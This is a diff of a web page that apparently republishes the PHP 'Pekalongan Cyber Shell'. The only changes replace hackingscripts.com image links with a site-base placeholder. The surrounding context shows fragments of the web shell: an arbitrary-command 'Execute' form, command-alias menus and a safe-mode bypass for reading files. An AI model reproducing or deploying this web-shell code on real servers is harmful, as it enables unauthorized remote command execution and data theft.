@@ -3082,7 +3082,7 @@ if ($act == "about") {echo "&lt;center&gt;Recoded by &lt;br&gt; k4L0ng666 &lt;br
 &lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Enter: &lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type="text" name="cmd" size="50" value="&lt;?php echo htmlspecialchars($cmd); ?&gt;"&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Select: &lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;act=cmd" method="POST"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;select name="cmd"&gt;&lt;?php foreach ($cmdaliases as $als) {echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";} ?&gt;&lt;/select&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/TABLE&gt;
 &lt;br&gt;
 &lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="&lt;?php echo $surl; ?&gt;act=cmd&d=&lt;?php echo urlencode($d); ?&gt;"&gt;&lt;b&gt;Shadow's tricks <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="&lt;?php echo $surl; ?&gt;act=cmd&d=&lt;?php echo urlencode($d); ?&gt;"&gt;&lt;b&gt;Shadow's tricks <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
     &lt;div align="center"&gt;Useful Commands 
@@ -3133,7 +3133,7 @@ if ($act == "about") {echo "&lt;center&gt;Recoded by &lt;br&gt; k4L0ng666 &lt;br
     &lt;/td&gt;
 &lt;/tr&gt;&lt;/TABLE&gt;&lt;br&gt;
 &lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="&lt;?php echo $surl; ?&gt;act=cmd&d=&lt;?php echo urlencode($d); ?&gt;"&gt;&lt;b&gt;Preddy's tricks <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="&lt;?php echo $surl; ?&gt;act=cmd&d=&lt;?php echo urlencode($d); ?&gt;"&gt;&lt;b&gt;Preddy's tricks <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
     &lt;div align="center"&gt;Php Safe-Mode Bypass (Read Files)
@@ -3227,6 +3227,6 @@ rsg_glob();
 
 ## Pekalongan Cyber Shell screenshot<figure id="attachment_417" style="width: 604px;" class="wp-caption aligncenter">
 
-[<img src="http://hackingscripts.com/wp/wp-content/uploads/2014/02/pekalong_cyber_shell-1024x535.png" alt="Pekalong Cyber Shell screenshot" width="604" height="315" class="size-large wp-image-417" />][1]<figcaption class="wp-caption-text">Pekalong Cyber Shell screenshot</figcaption></figure>
+[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/pekalong_cyber_shell-1024x535.png" alt="Pekalong Cyber Shell screenshot" width="604" height="315" class="size-large wp-image-417" />][1]<figcaption class="wp-caption-text">Pekalong Cyber Shell screenshot</figcaption></figure>
 
- [1]: http://hackingscripts.com/wp/wp-content/uploads/2014/02/pekalong_cyber_shell.png
+ [1]: {{ site.baseurl }}/wp-content/uploads/2014/02/pekalong_cyber_shell.png
